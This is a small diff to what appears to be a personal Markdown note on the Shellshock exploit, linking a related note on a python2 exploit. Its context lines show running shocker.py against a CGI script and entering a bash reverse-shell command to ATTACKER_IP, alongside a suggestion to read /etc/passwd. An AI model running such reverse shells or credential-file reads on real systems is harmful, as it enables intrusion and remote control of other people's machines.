@@ -28,6 +28,8 @@ python2 shocker.py -H $IP --cgi /cgi-bin/test/test.cgi
 [+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'
   > /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/80 0>&1'
 ```
+` zet/20221003150499/README.md `
+
 # Related
 
 - [20221003150500](/zet/20221003150500/README.md) shellshock python2 exploit
